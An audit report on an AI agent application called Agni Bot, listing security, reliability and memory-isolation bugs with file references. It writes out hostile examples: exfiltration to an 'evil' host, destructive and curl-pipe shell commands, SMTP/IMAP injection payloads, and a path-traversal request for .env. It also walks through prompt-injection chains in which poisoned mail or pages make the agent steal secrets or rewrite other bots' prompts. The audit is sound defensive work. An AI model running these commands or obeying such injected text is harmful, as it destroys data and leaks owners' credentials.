# bug.md — Agni Bot full audit (2026-10-30)

Scope: whole repo at `e4c6532` (server, tools, models/plugins, data/jobs,
web/Mac/CLI clients, protocol, landing, docs, CI). Ignored `legacy/`,
`.deepsec/`, `apps/firecrawl/`. Read-only review; no code changed.

Gates: `bun test apps/server packages` 525/525 pass · web 57/57 · client
40/40 · typecheck passes (turbo cache replay only). **Green tests, red
product.** Almost nothing below is covered by a test.

Legend: ✅ = re-verified by hand in this review · 🧪 = reproduced by running
code · ❓ = suspected, not proven.

---

## The verdict, bluntly

1. **The safety model is a prompt, not a boundary.** `read_file` has no
   sandbox, `bash` is gated by a regex denylist, unknown tools default to
   *ungated*, and any bot can rewrite any other bot's system prompt or schedule
   owner-authority turns for it. One poisoned email or web page = full
   read-and-exfiltrate of your secrets with zero approval cards.
2. **The daemon can be killed by any web page you visit.** Unauthenticated
   `appearance.*` frames + no Origin check + no error boundary = one
   WebSocket message from a browser tab and the server exits.
3. **"Each bot has its own memory" is not true.** The tagger merges every
   channel into one bot's memory, the compactor ships private owner facts to
   any bot's model call, and model-written labels decide what becomes a global
   fact.
4. **"Never reset" memory decays by design.** Four overlapping summary
   systems, each with a different truncation bug; failed summaries are dropped
   forever; vector search ranks an arbitrary 24-row sample.
5. **"Quick questions must be fast" has no guard.** Budgets were removed,
   failover takes ~94 s per stalled provider inside a 120 s turn, every token
   re-renders the whole web UI, and several per-message queries scan full
   history.
6. **Correctness lives in process memory.** Turn locks, queued owner messages,
   approvals, debounce batches — all lost or broken on crash/restart; a second
   `serve` re-queues the live daemon's jobs.

---

## Fix-first list (do these before anything else)

| # | Issue | Where |
|---|---|---|
| 1 | Sandbox `read_file`/`grep`/`glob` to scratch (realpath), or gate them | `tools/read-file.ts:24`, `tools/search.ts:31,79` |
| 2 | Flip `requiresApproval` default to **true**; allowlist read-only bash instead of denylist | `agent/approval-broker.ts:105-116`, `tools/bash.ts:36-55` |
| 3 | Ownership checks on `update_agent`, `job_schedule`, `job_cancel`, `create_agent` scope ceiling | `tools/update-agent-tool.ts:43`, `tools/jobs-tool.ts:70,193,209` |
| 4 | One auth gate before the `switch` in `dispatch()`; Origin check on `/ws`; try/catch + `unhandledRejection` handler | `ws/dispatch.ts:196-212`, `ws/server.ts:133,151` |
| 5 | Landing dev server path traversal leaks `.env` | `apps/landing/serve.ts:22-28` |
| 6 | SMTP dot-stuffing + CRLF rejection; IMAP quoting | `mail/smtp.ts:64-97`, `tools/mail.ts:181`, `mail/imap.ts:59,110` |
| 7 | Tagger/compactor: derive agent + scope from row, never from model output | `jobs/tagger.ts:113`, `agent/tagger.ts:162`, `agent/compactor.ts:27` |
| 8 | Atomic `plugins.json` write + don't treat parse error as empty | `plugins/config.ts:70-84` |
| 9 | Router: retry only retryable statuses, header timeout, stall timeout, budget-aware failover | `models/router.ts:168-243`, `models/client.ts:131-258` |
| 10 | Turn lock: `activeThreads.add` before the first `await` | `agent/task-loop.ts:246` vs `:400` |

---

## 1. Critical

### C1 — `read_file` has no sandbox; read + exfiltrate with zero approvals ✅
- `tools/read-file.ts:24-27` does `statSync`/`readFileSync` on any path. The
  header comment ("Paths outside the sandbox are rejected") and
  `tools/task-registry.ts:174` are false.
- `approval-broker.ts:116` → `default: return false`.
- Attack: injected mail/web text → `read_file("~/.agni/plugins.json")` (Gmail
  app passwords, OAuth refresh tokens) → `web_fetch("https://evil/?d=…")` or
  ungated `mail_send` from Agni's own mailbox. No card shown at any step.
- Also in the routine "read-only" allowlist (`routines/run.ts:16-20`).

### C2 — `bash` is gated by a denylist regex 🧪✅
- `tools/bash.ts:36-55`. All of these return `isDestructive === false`:
  `rm -rf $HOME`, `rm -rf ./*`, `rm -r -f x`, `find ~ -delete`,
  `truncate -s0 ~/.agni/agni.db`, `mv ~/.agni /tmp/x`,
  `echo k >> ~/.ssh/authorized_keys`, `dd of=/dev/disk0 if=/dev/zero`,
  `curl x | python3`, `git -C . push`, `s''udo id`, `perl -e 'unlink…'`.
- `cwd` defaults to `process.cwd()` (`bash.ts:145`), not scratch; model-chosen
  `cwd` gets `mkdirSync(..., {recursive:true})` anywhere.
- Violates AGENTS.md "shell … approval-gated". The `write_file` scratch gate is
  decorative while `bash` writes anywhere.
- Denylists for shell are unwinnable. Allowlist a few read-only commands or
  gate all of it.

### C3 — Any bot can rewrite any bot's system prompt ✅
- `tools/update-agent-tool.ts:43-53`: no caller/ownership check. Tool is in
  `DEFAULT_AGENT_TOOLS` (`agent/personas.ts:171`). Only guard is `peerInput`.
- Attack: injected page in a normal owner turn → `update_agent({agent_id:"ea",
  prompt:"…"})`. Persistent backdoor in the bot that holds bash + mail. Can
  also flip any bot to `visibility:"shared"`, voiding the visibility model.

### C4 — `job_schedule` launders injected text into owner-authority turns
- `tools/jobs-tool.ts:70-73,193`: any `agent_id`, no caller check. Payload
  carries no `peer`/`inputRole`, so the scheduled turn runs with
  `peerInput=false` (`task-loop.ts:279`) — i.e. as if the owner typed it.
- Attack: low-privilege bot reads hostile page → schedules
  `{agent_id:"ea", everyMinutes:1, text:"…"}` → `ea` runs it every minute
  with full tools, bypassing every `peerInput` guard.

### C5 — Unauthenticated frame crashes the daemon; any web page can send it ✅🧪
- `ws/dispatch.ts:196-212`: `appearance.list/save/activate/delete` never call
  `requireAuth`. `activateAppearanceProfile` throws on unknown id
  (`stores/appearance.ts:27`). Nothing catches it (`ws/server.ts:151`, no
  `unhandledRejection` anywhere in `src/`). Auditor confirmed Bun 1.4.3 exits
  on a rejected promise in an async `message` handler.
- `ws/server.ts:133`: no Origin/Host check on upgrade, so any site in the
  owner's browser can open `ws://127.0.0.1:8787/ws` (DNS rebinding works too).
- Repro: `{"type":"appearance.activate","id":"x"}` with no `hello` → exit.
- Root cause: ~40 hand-copied `if (!requireAuth…)` instead of one gate.

### C6 — Landing dev server serves any file, including `.env`, on 0.0.0.0 🧪✅
- `apps/landing/serve.ts:22-28`: `decodeURIComponent(pathname)` then
  `join(DIR, pathname)`; `%2F` bypasses URL normalization. No hostname →
  binds all interfaces.
- Auditor: `GET /..%2F..%2F.env` → 200, 149 bytes. Anyone on the café Wi-Fi
  while you run `bun run landing` gets your provider keys.

---

## 2. High

### Security / safety
- **H1 SSRF filter bypass via IPv4-mapped IPv6** 🧪 — `tools/fetch-url.ts:86-90`
  string-matches `::ffff:127.` but `URL` normalizes to hex. Allowed:
  `[::ffff:7f00:1]`, `[::ffff:169.254.169.254]`, `[64:ff9b::7f00:1]`,
  `[::7f00:1]`, `[fec0::1]`. Parse the IP and check ranges numerically.
- **H2 DNS rebinding** — `fetch-url.ts:40-45`, `routines/preflight.ts:40-41`
  resolve, check, then `fetch` resolves again. Pin the IP.
- **H3 Firecrawl path skips SSRF check entirely** — `tools/web.ts:144-154`;
  self-hosted Firecrawl fetches localhost/metadata from its own network.
  `deep_research` (`web.ts:190`) ignores `allowedHost`.
- **H4 SMTP smuggling** — `mail/smtp.ts:87-97` writes body raw, no
  dot-stuffing; subject/recipients unchecked for CRLF. An *approved* email to
  Alice can carry `\r\n.\r\nMAIL FROM…RCPT TO:<attacker>` = a second,
  unapproved email from your account. Subject CRLF injects `Bcc:`.
- **H5 IMAP command injection from a "read-only" tool** — `tools/mail.ts:181-188`
  escapes `"` only; `mail/imap.ts:110` interpolates into `SEARCH`. Injected
  `\r\nA9 STORE 1:* +FLAGS (\Deleted)\r\nA10 EXPUNGE` wipes the mailbox.
  Password unescaped in `LOGIN` (`imap.ts:59`). `mail_search` is in the
  routine allowlist.
- **H6 Owner-mailbox gate keyed on exact string** ✅ — `approval-broker.ts:115`
  checks `args.account === "owner"`; `mail.ts:43-46` treats every non-`"agent"`
  value as owner. `account:"Owner"` → ungated send from your real mailbox.
  Tool args are never schema-validated.
- **H7 Approval card truncates the command** — preview cut at 200 / action at
  120 chars (`approval-broker.ts:124,139-141`). 200 chars of harmless text then
  `; rm -rf ~`. Mail approvals never show the body (`:131`).
- **H8 `run_privileged` os-mode runs an unseen root script** —
  `tools/privileged-os.ts:47-53` `do shell script … with administrator
  privileges` with no `with prompt`; macOS shows a generic dialog. `auto`
  picks os-mode for anything starting with `sudo` (`:138`): `sudo true; curl
  evil|sh` runs as root after one Touch ID. No `requiresApproval` case. ❓
  (macOS dialog text not run.)
- **H9 `grep`/`glob` walk `/` synchronously with a model-supplied regex** —
  `tools/search.ts:31,79,113-131`: follows symlinks, reads whole files, regex
  `(a+)+$` freezes the event loop; `Promise.race` timeout
  (`task-loop.ts:854`) can't interrupt sync code. Also reads `~/.agni`.
- **H10 `sendError` broadcasts to every device and fills the replay ring** —
  `ws/dispatch.ts:1542-1545` uses `emit` not `reply`. Unauthed junk frames
  push errors to all paired devices, burn seqs, evict real frames →
  spurious `resync_gap` full reloads. Device A's errors show on device B.
- **H11 Any throw in a detached task kills the process** — `.then` without
  `.catch` at `dispatch.ts:239`; `void` promises at `:146,180,389,636`. Any
  SQLite busy/disk-full = exit.
- **H12 ChatGPT integration's eligibility contradicts your own rules** —
  `models/chatgpt-auth.ts:1` ("open-source Agni") and `README.md:99` use
  OpenAI's *open-source* SIWC flow. AGENTS.md: "never describe the repo as
  open source". Transport is clean (PKCE, nonce, JWKS, `api.openai.com/v1/responses`,
  no Codex client id), but eligibility is not. Also loopback-only callback
  can't work on bb-1 ("remotely hosted" anyway). **Owner decision needed.**

### Reliability / correctness
- **H13 Failover is fake for stalled providers** — `models/router.ts:44-46,
  168-227` + `config.ts:77-78`: 3 tries × 30 s first-token + backoff ≈ 94 s per
  provider inside a 120 s turn (`task-loop.ts:459`). A hung Groq starves
  Cerebras. Retries ignore `health`.
- **H14 No timeout before headers** — `models/client.ts:131-153`: first-token
  timer arms after `fetch` resolves. Black-holed endpoint / LM Studio loading
  eats the whole turn. (ChatGPT path does it right, `chatgpt-responses.ts:62`.)
- **H15 No mid-stream stall timeout + never-aborting background signals leak
  router slots** — `client.ts:193-258`, `agent/compactor.ts:42`
  (`new AbortController().signal`), capacity 4 and busy = reject
  (`router.ts:98,144`). Four stalled compactor/tagger streams → every owner
  message gets `RouterBusyError` forever.
- **H16 400/401/403/404/413 are retried and poison health** —
  `router.ts:170-243`. One oversized prompt marks every provider unhealthy.
- **H17 `plugins.json` non-atomic write; parse error = empty = wipe** —
  `plugins/config.ts:70-84`, cached in `service.ts:55`. Crash/full disk
  truncates file → next start loads `{}` → next `save()` permanently erases
  Gmail passwords, OAuth tokens, client secret.
- **H18 `plugins.json` mode only set on create** — `plugins/config.ts:82-83`;
  pre-existing 0644 file stays world-readable. Dir not 0700.
- **H19 Turn lock is check-then-act across awaits** ✅ — `agent/task-loop.ts:246`
  checks `activeThreads.has`; `.add` is at `:400`, after `await
  retrieveFacts` (embedder fetch, 8 s timeout). Two turns run on the same
  thread; first `persistSession` no-ops silently; replies interleave.
- **H20 Background turn retries replay side effects** — `jobs/turn.ts:162-167`
  throws on non-`end`; runner retries 3× (`jobs/runner.ts:119-130`), each
  re-appending the input and re-running tools. A delegated task that sent mail
  then timed out sends it again ×3.
- **H21 Second `serve` re-queues the live daemon's jobs** ✅ — `index.ts:72`
  `requeueStuckJobs` runs **before** `startServer` hits EADDRINUSE. Every
  running job gets re-run.
- **H22 Owner messages queued behind a busy thread exist only in RAM** —
  `ws/dispatch.ts:314-380` (`threadQueues`, `messageBatches`). Crash/restart =
  your follow-ups vanish with no DB trace.
- **H23 Depth guardrail resets on every `delegate_task` hop** — `jobs/turn.ts:337`
  builds `rootGuardrail(...)` = depth 1 again. Only brake is exact-text
  fingerprint dedupe (`stores/peer-chains.ts:25-34`). With budgets removed and
  `everyMinutes:1` allowed, cost is unbounded.

### Memory isolation (breaks the product promise)
- **H24 Tagger merges all channels into one bot** ✅ — `jobs/tagger.ts:96-113`
  ignores `payload.channelID`, takes the 40 oldest untagged rows across *all*
  channels, assigns `agentID = payload.agentID ?? messages[0].from_id` (which
  can be the device id). Bot B's private DM → bot A's memories.
- **H25 Model-written `source` decides global facts** — `agent/tagger.ts:162`
  passes LLM-output `item.source` to `mayCreateUserFact`. Injected email
  quoted by a bot gets labelled `source:"user"` → global fact every bot sees.
- **H26 Compactor ships private owner facts to any bot's model** —
  `agent/compactor.ts:27-29` selects 100 `global_user` facts with no
  visibility filter, sends them to a free third-party provider in another
  bot's context, and lets the model write them into that bot's scope.
- **H27 Vector search ranks an arbitrary sample** ✅ —
  `stores/agent-memories.ts:457-461`: `… WHERE … LIMIT 24` with **no ORDER
  BY**, then cosine over those 24. Past 24 embedded facts, semantic recall
  only ever sees roughly the oldest rows. Tests use ~2 rows.

### Memory durability ("never reset" is not true)
- **H28 Failed block summary is lost forever** — `agent/rollover.ts:324-327`
  swallows errors → `jobs/rollover.ts` reports success → no retry, no row.
  One free-tier 429 deletes a block from long-term memory. Test logs show it
  firing.
- **H29 Rollover summarizes a fragment** — `rollover.ts:294-300`: last 40
  messages, then `.slice(0, 12_000)` keeps the *oldest* 12k of those. Blocks
  rotate at 20.8–27.2k chars. Start and end of every block are dropped.
- **H30 Summaries of summaries clamped to 900 chars** — `CARRY_SUMMARY_CHARS`
  (`rollover.ts:63`). Week-1 decisions survive only by winning every rewrite.
  Day/epoch rollups are a 12-fragment dedupe (`jobs/summary-rollup.ts`).
- **H31 In-session compaction keeps the head, drops the newest** —
  `task-loop.ts:952-953` `truncate([prev, dropped].join(), 8000)` keeps head.

### Clients
- **H32 Reconnect mid-reply duplicates/reorders streamed text** — server
  starts live broadcast at `hello` (`dispatch.ts:231-276`) before `resync`
  (`:280-286`); client applies every frame with no seq dedupe
  (`packages/client/src/connection.ts:243-276`; `token` does `text +=
  delta`). Same bug in `AgniConnection.swift:198-216`. Breaks the P1 proof
  "kill app mid-turn, reopen".
- **H33 Web silently drops `task.create.ok`, `task.list.create.ok`,
  `task.activity.ok`** 🧪 — hand-kept `KNOWN_SERVER_TYPES`
  (`packages/client/src/protocol.ts:59-101`) omits them →
  `__unknown` → early return (`app-model.ts:1465`). Activity panel always
  empty. Derive from `ServerFrameSchema.options`.
- **H34 Mac has no `secret.request`** — `Frames.swift:972-998` decodes as
  `.unknown`; `run_privileged` with only the Mac app open hangs to timeout.
- **H35 Mac form answers sent as chat messages** — `AppModel.swift:342-345`
  calls `send(text:)`; server waits for `form.answer`. Question never resolves,
  answer starts a new turn.
- **H36 Approvals/forms/secrets lost during reconnect** — `app-model.ts:931-962`
  marks resolved locally, `send` throws, `.catch(() => undefined)` swallows.
  Card gone, server never hears, replay won't resend. Turn hangs. (38 such
  swallow-all catches in that file.)
- **H37 Every streamed token = 2 full snapshot rebuilds + sync localStorage
  write + re-parse of every message's markdown** — `app-model.ts:360-366,
  1451-1455`; no `memo` anywhere; `ThreadView.tsx:101`. Long threads stutter.

---

## 3. Medium

### Server surface
- **M1** Revoked device stays connected with full rights — `auth/tokens.ts:52-64`;
  `session.authed` never re-checked; no session-by-device index.
- **M2** State dir + SQLite created with umask perms; Google refresh tokens
  plaintext in `plugin_connections.tokens` — `db/index.ts:9`,
  `plugins/store.ts:116-127`; share exports and daemon log too. Attachments
  use 0700/0600, so it's inconsistent.
- **M3** Frame seq goes backwards after a crash (saved every 32 frames,
  `ws/frame-log.ts:49,60`); `adoptSeq` + client keeping higher `lastSeq` = silent
  missed frames. Clients don't detect `hello.ok.lastSeq < stored`
  (`connection.ts:256`, `AgniConnection.swift:214`).
- **M4** Dropping the socket aborts the running turn (`ws/server.ts:175`);
  queued turns hold a dead session and can't be cancelled. "Background-first"
  isn't.
- **M5** Debounce and `user.typing` never work: `messageBatches` is a WeakMap
  keyed by a deps object rebuilt per frame (`dispatch.ts:299`,
  `server.ts:151-170`). The same trap is documented and fixed 15 lines later for
  `threadQueues`.
- **M6** Share links: permanent, unauthenticated, plain http, no expiry/revoke, no
  CSP/nosniff/frame-ancestors, same origin as the API, include every tool arg,
  result and reasoning — `ws/server.ts:125-131`, `share/document.ts:76-80,151-214`.
  `shareBaseURL` yields `http://0.0.0.0:8787`.
- **M7** CSS injection via agent colour into exports — `create-agent-tool.ts:59`
  passes any string; `share/render.ts:134` HTML-escapes inside `style=`.
  `url(https://evil)` beacons on every export view.
- **M8** ReDoS in `STOP_COMMAND` (`dispatch.ts:324`), quadratic, 151 ms at 20k
  chars; `msg.send.text` has no max (16 MB default).
- **M9** Per-connection replies consume the shared 1000-slot replay ring
  (`frame-log.ts:55-58`).
- **M10** `conversation.history` ignores `limit` for channel rows, N+1
  attachments, O(n·m) `findIndex`+`JSON.stringify` (`dispatch.ts:1034-1072`).
- **M11** Onboarding eats the first message >64 chars silently
  (`dispatch.ts:559-566`), and runs a full-main-channel `count(*)` on **every**
  message (`:566-568`).
- **M12** Canary scan checks `data/agni.sqlite` not `~/.agni/` and skips a missing
  log silently (`scripts/canary-scan.ts:33-43`); misses `tool_calls`,
  `message_log`, `jobs`, exports. EVAL-004 can be green while leaking.

### Tools / agents
- **M13** Scratch check uses `path.resolve` not `realpath` — symlink escape +
  TOCTOU (`tools/write-file.ts:24-52`).
- **M14** `handoff` child turns drop `approval.request` and `secret.request`
  (`agent/handoff.ts:111-113`); child blocks to timeout.
- **M15** Secret redaction defeated by `sh "$SUDO_ASKPASS" | rev` / `xxd`
  (`tools/bash.ts:102-142`).
- **M16** Routines aren't read-only: `read_file`, `grep`, `mail_search` allowed;
  `preflight.url` fetched every tick outside `allowedDomains`; `web_search`
  query leaks under allowlist; subdomain wildcard (`egress.ts:46`) means
  `github.io` = everyone.
- **M17** Model-authored preflight SQL with no LIMIT runs sync on the main
  thread (`routines/preflight.ts:56-60`): `FROM messages a, messages b` freezes the
  daemon; can read any table.
- **M18** `draft_email` approval isn't bound to the mail actually sent
  (`tools/ask-tool.ts:77-122`).
- **M19** `create_agent` can grant any tool (`bash`, `run_privileged`,
  `create_agent`) and `readwrite` memory — no ceiling at creator's scope
  (`agent/creation.ts:79-81`).
- **M20** `expand` returns full text for `summary`-visibility agents
  (`tools/expand-tool.ts:90`).
- **M21** IMAP "uid" is a sequence number; no MIME/QP/base64 decoding; body line
  `A3 OK` truncates parse; timeout returns partial silently (`mail/imap.ts:92-117`).
- **M22** Skills dir is writable by ungated bash → persistent injection store
  (`tools/skills.ts:16,135`).
- **M23** ❓ Non-array `to` → per-character RCPT then `join` throws in a socket
  listener → process exit (`tools/mail.ts:171`, `mail/smtp.ts:72-89`).

### Models / plugins
- **M24** Google OAuth refresh never persists `expires_at` → refresh on every call
  after first expiry, unserialized (`plugins/service.ts:381-385`). (No prod caller
  yet.)
- **M25** Calendar/Drive/Notion/Granola tools advertised in catalog don't exist
  (`plugins/catalog.ts:79-168`); owner sees "connected", bot can't use it.
- **M26** Capability policy grid (free/approval/off) is stored, never read
  (`catalog.ts:5-46`, `service.ts:240,270`). `docs/plugins.md:43` lies.
- **M27** Firecrawl "connected" is false: key goes to `plugins.json`, `web.ts:9-16`
  reads only env at module load.
- **M28** Plugin secrets duplicated plaintext into SQLite (`service.ts:242,272,409`).
- **M29** Upstream error bodies (300 chars) flow into logs, `/health` and client
  frames (`client.ts:162`, `router.ts:221-255`).
- **M30** Stream ending without `[DONE]` treated as success — truncated answers
  and half-JSON tool calls persisted as final (`client.ts:194-278`).
- **M31** ChatGPT `needsLogin` bricks every bot and job — no fallback to free
  providers (`router.ts:130-131`).
- **M32** Corrupt `chatgpt/accounts.json` crashes daemon startup
  (`chatgpt-auth.ts:69-72`, `ws/server.ts:87`).
- **M33** Provider keys written to `process.cwd()/.env`, no lock; concurrent
  custom adds collide on `AGNI_CUSTOM_KEY_1` (`provider-settings.ts:56-169`).
- **M34** Custom provider base URL → SSRF to RFC1918/metadata, cleartext http,
  follows redirects with bearer (`providers.ts:182-194`, `client.ts:131`).

### Data / jobs
- **M35** No `busy_timeout`; every CLI (`job add`, `pair`, `revoke`) opens the live
  DB **and runs migrations** under the daemon (`db/index.ts:10-12`,
  `index.ts:246,397-435`).
- **M36** Wake deferral re-enqueues a new job every 1.5 s with no cap
  (`jobs/turn.ts:105-112`) — a stuck parent spawns a job row every ~3 s.
- **M37** Strictly sequential job runner: one `memory.embed` (up to 200 × 8 s)
  delays the 07:55 brief by ~26 min (`jobs/runner.ts:89-101`).
- **M38** Recurring jobs die permanently after 3 failures, flat 30 s retry, no
  backoff/jitter (`runner.ts:120-124`). A 90 s outage kills your daily routine.
- **M39** Archived memories still retrieved — `memoryFilter` ignores
  `archived_at` (`stores/agent-memories.ts:335-348`).
- **M40** FTS `AFTER UPDATE` triggers have no column filter → every
  `markMemoryUsed` (every recall, every turn) rewrites FTS
  (`migrations.ts:661-683`). Use `AFTER UPDATE OF content, tags, key_slug`.
- **M41** Rollup ladder freezes partial days, duplicates days past 50 (existence
  check reads `limit 50`), runs once per boot (`summary-rollup.ts:67-112`,
  `jobs/memory.ts:63-68`).
- **M42** `memory.embed` stops once caught up; new facts get no vectors until
  restart (`jobs/memory.ts:56-61`).
- **M43** Schedules use server TZ, not owner's — bb-1 in UTC fires "09:05" at
  09:05 UTC (`jobs/schedule.ts:51-63`, `brief.ts`). `everyMs` drifts by run time.
- **M44** Daily reminder fires 7× back-to-back after a week offline
  (`task-reminders.ts:47-58`).
- **M45** `previousBlockTail` sorts every message of every closed block per
  low-recall turn — O(lifetime) — and can return a cron job's output
  (`agent/retrieval.ts:142-155`).
- **M46** `persistSession` rewrites the full 40k+ JSON log 2–4× per tool step, each
  an fsync (`task-loop.ts:513,563,600`). O(n²) bytes per turn.
- **M47** No step cap since `e4c6532`; `consecutiveNonTextSteps` resets on any
  successful tool (`task-loop.ts:620`); 120 s timer starts *after* retrieval.
- **M48** Concurrent compactions duplicate summaries and facts; runs in parallel
  with the tagger → overlapping memories under different slugs
  (`agent/compactor.ts`).
- **M49** "Forget" doesn't forget: only `agent_memories` rows deleted; same text
  stays in `messages`, `channel_messages`+FTS, summaries, `message_log`,
  `tool_calls.result`. No retention anywhere, no `secure_delete`.
- **M50** **No backups.** Not `VACUUM INTO`, not litestream, nothing. The DB *is*
  the product.
- **M51** Crash recovery appends the next unrelated message to a stale
  `message_log` under the old `turn_id` (`task-loop.ts:259-267`).
- **M52** `putAgentMemory` supersede isn't transactional
  (`agent-memories.ts:164-228`).

### Clients
- **M53** Bare host → plaintext `ws://` + `http://` health, even for public
  hosts; token sent in cleartext (`packages/client/src/settings.ts:82,111`,
  `Credentials.swift:34`).
- **M54** Device token in `localStorage`, no CSP on the web app. Markdown is safe
  today (`skipHtml`, URL filter), but any future XSS = token theft.
- **M55** Mac token file written 0644 then chmod'd; `try?` swallows failures and
  reports "saved" (`Credentials.swift:102-105`).
- **M56** Unknown enum value in a known frame drops the whole frame and its seq
  is never recorded → re-fails every reconnect. Contradicts
  `docs/protocol.md:179`.
- **M57** Mac protocol drift is massive and the fixtures test doesn't catch it
  (`Frames.swift:11-12` claims it does). Missing ~16 client frames, ~10 server
  frames, attachments, task fields, `needs_input`. Attachments never render on
  Mac.
- **M58** Reconnect backoff resets after every handshake, no jitter
  (`connection.ts:172,240`) — crash-looping server gets hammered every 0.5 s by
  every client in lockstep.

---

## 4. Low

- `/health` is CORS `*` and leaks activity, token counts, provider ids, raw
  `lastError` to any website (`ws/server.ts:40-44`).
- `stopDaemon` SIGKILLs whatever PID is in the file, no identity check; no start
  lock (`daemon.ts:164-218`).
- `revokeDevice` uses `LIKE` with user input + `LIMIT 1` no ORDER BY — `revoke %`
  revokes a random device (`auth/tokens.ts:55-57`).
- Agent ids not validated; `conversation.open{agentID:"x"}` creates garbage rows.
- `approve.reply` wakes the waiter even when the UPDATE matched 0 rows
  (`dispatch.ts:1135-1142`).
- "Always allow" button is offered and never stored; exports even say "remembered"
  (`approval-broker.ts:92`, `share/render.ts:174`).
- Upload quota check-then-write races; chunked uploads skip the length check.
- `verifyToken` writes `last_seen_at` on every HTTP GET.
- ❓ `session.local` by `remoteAddress` only — a localhost reverse proxy makes every
  remote client "local".
- ❓ `Bun.serve` without `development:false` may serve stack-trace error pages.
- ❓ `socket.send` backpressure return ignored → silent frame drops.
- Raw `String(error)` broadcast to clients (`dispatch.ts:666`).
- Global `__AGNI_DYNAMIC_TOOL_HINTS__` races across concurrent turns; its only
  reader is dead code (`task-loop.ts:321-325,894`).
- ❓ Tool-call cache keyed `(turn_id, call_id)` — providers reusing `call_0` get a
  stale result.
- SMTP pipelines `RCPT`s + `DATA` blindly; body can go before `354`.
- `job_list` shows every bot's jobs; `job_cancel` has no ownership check.
- Google OAuth: no PKCE, state never expires, `LIKE` on raw state, no timeouts on
  Google calls, redirect hard-coded to loopback.
- `.env` replace treats `$&`/`$$` in keys as patterns (`provider-settings.ts:250`).
- Final SSE line dropped without trailing newline; `firstTokenMs` overwritten;
  unbounded stream buffers; retry backoff ignores abort.
- Rotated ChatGPT refresh token orphaned on concurrent disconnect; revoke ignores
  discovery `revocation_endpoint`.
- Duplicate seeded singleton jobs (existence check reads first 50 only).
- Job table has no retention; `updated_at` unindexed.
- Duplicate indexes `idx_channel_messages_channel{,2}`; `idx_jobs_state` ⊂
  `idx_jobs_claim`.
- Context compiler keeps the *stalest* part of each slot; persona/roster/tool
  hints unbudgeted; 40k cap excludes system prompt + tool schemas ❓ overflows 8k
  free models.
- `needs_input` shown raw to the user (`protocol.ts:155-170`).
- CLI/probe accept `--token` on argv (visible in `ps`, shell history).
- ❓ Vercel deploys `serve.ts`, `package.json` from `apps/landing`.
- `TasksView.tsx:138` revokes the blob URL immediately (breaks Safari/Firefox) —
  and is a ~1000-char line of JSX.
- `plugin.connect.ok` opens `authorizeURL` without a scheme check.
- Dead code: `exportConversation`, `exportedLink`, `bindDirect`, `columnExists`,
  `stableSystemPrompt`; `boundChannelID` never cleared.
- Message arrays unbounded in both clients.

---

## 5. System design — what's structurally wrong

1. **Safety is enforced by prompt wording.** Untrusted tool output goes back to
   the model raw (`task-loop.ts:881`); only peer text gets an envelope. The
   `peerInput` flag guards memory/agent tools but **not** `bash`, `mail_send`,
   `web_fetch`, `run_privileged` — the ones that matter. Fix the shape:
   capability ceilings per bot, taint tracking (a turn that has read untrusted
   content can't call egress tools without a card), default-deny for new tools.
2. **No authority model between bots.** Any bot can edit, schedule, cancel,
   create, or impersonate the owner for any other bot. "Specialised bots" need
   an owner → bot hierarchy where bots act only on themselves.
3. **One process, in-memory correctness.** Locks, queues, debounce, approvals,
   interrupt map, frame ring — all RAM. Only jobs are durable, and they're half
   a queue: claims without leases/heartbeats, non-idempotent handlers, no
   backoff, recurring jobs that die, one lane for everything. Persist owner
   messages on receipt; add `lease_until` + `owner_pid`; separate lanes for
   user-facing timers.
4. **Four memory/summary systems, none authoritative.** `agent_sessions.summary`,
   `channel_summaries`, `conversations.summary` (900 chars), and the
   block/day/epoch ladder — plus two fact extractors (tagger + compactor) and
   legacy `memories`/`links`. Each has its own truncation bug. Pick one
   pipeline, make it retryable and source-grounded.
5. **Isolation is read-side only.** Writers take scope from model output.
   Visibility must be a write-path invariant derived from `channel_id` and
   `from_type`.
6. **Performance has no budget or test.** EVAL-005 runs on `:memory:` with no
   model. Each turn does FTS ×2 with full recall rewrite, a possible 8 s embed,
   an O(lifetime) tail scan, rollups, roster build, multiple full-log fsyncs and
   a full-channel count. Add a p50/p95 latency eval against a seeded DB.
7. **Two hand-written clients drift apart.** `conversation.ts` vs
   `Conversation.swift`, `connection.ts` vs `AgniConnection.swift`. Same bugs in
   both (H32), Mac far behind (M57). Generate Swift frames from the zod schema,
   or make the fixtures test check every type and field.
8. **God files.** `ws/dispatch.ts` 1689 lines (transport, auth, onboarding,
   batching, queues, capture with outbound fetch, history). `runTaskTurn` ~470
   lines. `app-model.ts` 1900 lines with a 25-branch `if` chain and 38
   swallow-all catches. `app.css` 5216 lines with 41 duplicated selectors.
9. **Three copies of everything small.** Bearer parsing/CORS/reply in three HTTP
   files; upload quota logic twice; channel-id rule ×5; `clip` ×2;
   `turnSettings` ×2; three localStorage helpers.
10. **No backups, no retention, no forget.** For a product whose core asset is
    years of memory, this is the biggest product risk after security.

---

## 6. Tests, CI, docs

- **Tests:** broad and shallow. No concurrency tests, no crash-recovery of a
  running turn, no rollover-loss test, no vector search over >24 rows, no
  bash-gate bypass tests, no SSRF IPv6 cases, no auth-gate test per frame type.
  Every test re-applies 41 migrations (much of the 46 s).
- **Evals:** "seven" is generous. EVAL-007 returns `skipped` on both branches
  (`evals/evals.ts:401-406`); EVAL-001b skipped without an embedder; EVAL-002b
  asserts a constant. ~5 real checks, zero provider-backed.
- **CI** (`.github/workflows/ci.yml`): `bun-version: latest` (non-reproducible),
  actions not SHA-pinned, no evals, no `swift build`/`swift test` (so Mac drift
  never fails CI), no secret scanning.
- **Typecheck:** passing run was a full turbo cache replay; nothing re-checked.
- **Doc drift:**
  - `README.md:335` still lists the instant lane (removed); `:337` calls P1 "Mac
    app (Tauri)" — it's SwiftUI. `.env.example:22` also says "Instant lane".
  - `docs/architecture.md:152` says 40 migrations; code has 41.
  - `docs/protocol.md:3` mentions an Android app; `:119` omits `needs_input`;
    `agent.presence`, `memory.list*`, `provider.models.*` undocumented.
  - `docs/plugins.md:13,43-46` claim OAuth/policy is "built"/"what the server
    allows" — no tool consumes it.
  - `plugins/config.ts:7` says `data/plugins.json`; real default is
    `~/.agni/plugins.json`. `extensions/README.md:28` describes `plugins.json`
    as a plugin manifest; it's the credentials store.
  - `migrations.ts:5-8` says FTS has "no trigger magic"; migration 24 uses
    triggers.
  - `read-file.ts`, `search.ts`, `task-registry.ts` describe a sandbox that
    doesn't exist.
  - `.env.example:7` `AGNI_DB_PATH=~/.agni/...` — `~` is never expanded.
  - `AGENTS.md` says `bun test apps/server packages`; root `test` script and CI run
    `apps/server packages/protocol` (skips `packages/client` under bun).
  - `apps/public/*.html` still use the old "personal assistant" framing; ❓
